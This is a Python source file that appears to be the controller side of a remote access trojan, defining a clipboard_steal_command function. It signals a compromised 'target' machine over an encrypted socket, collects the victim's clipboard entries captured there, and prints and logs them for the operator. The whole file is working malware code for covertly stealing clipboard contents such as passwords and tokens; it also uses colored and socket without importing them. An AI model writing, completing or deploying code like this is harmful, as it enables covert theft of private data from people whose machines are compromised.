from components.networking import decrypt_message, encrypt_message, clear_socket_buffer
from components.logging import log_activity
import uuid
import time

def clipboard_steal_command(client_output, conn_obj):
    received_data = []

    decrypted_client_message = decrypt_message(client_output)  # Signal message
    if decrypted_client_message.decode() != "STARTED":
        return colored("[-] An error has occured when starting the clipboard steal function. Please try again in a few moments.", "red")

    conn_obj.settimeout(0.5)  # Set to 0.5 seconds or any appropriate low value
    print(f"\nStarted clipboard listening session on {time.strftime('%H:%M:%S', time.localtime())}")
    
    while True:
        try:
            input("Press Ctrl+C to stop and receive clipboard data: ")
        except KeyboardInterrupt:
            conn_obj.sendall(encrypt_message("END"))
            print(f"\nEnded clipboard listening session on {time.strftime('%H:%M:%S', time.localtime())}")
            print() # Clear above clutter
            
            break
        print("Invalid data, only press 'Ctrl+C' to stop")

    # Attempt to receive leftover data AFTER interrupt
    try:
        while True:
            try:
                output = decrypt_message(conn_obj.recv(4096))
                if output:
                    decoded_output = output.strip().decode() 
                    received_data.extend(decoded_output.split("\n"))
                else:
                    break
            except socket.timeout:
                break
    except Exception as e:
        print(f"[-] Error when trying to gather clipboard data: {e}")

    try:
        if not received_data:
            log_activity(f"No clipboard entries have been gathered.", "info")
        
            return "[-] No clipboard data gathered from target"
        else:
            print("Loading clipboard data . . .")
            print("Gathred clipboard data :")
            # Reorganise output
            result, counter = [], 0
            for data in received_data:
                counter += 1
                if data:
                    result.append(colored(f"[+] Clipboard Entry {counter} -> {data}", "green"))

            conn_obj.settimeout(10)  # Reset to original timeout
            log_activity(f"Gathred {len(result)} clipboard entries.", "info")
            
            return "\n".join(result) 
    finally:
        clear_socket_buffer(conn_obj)  # Clear the buffer to prevent leakage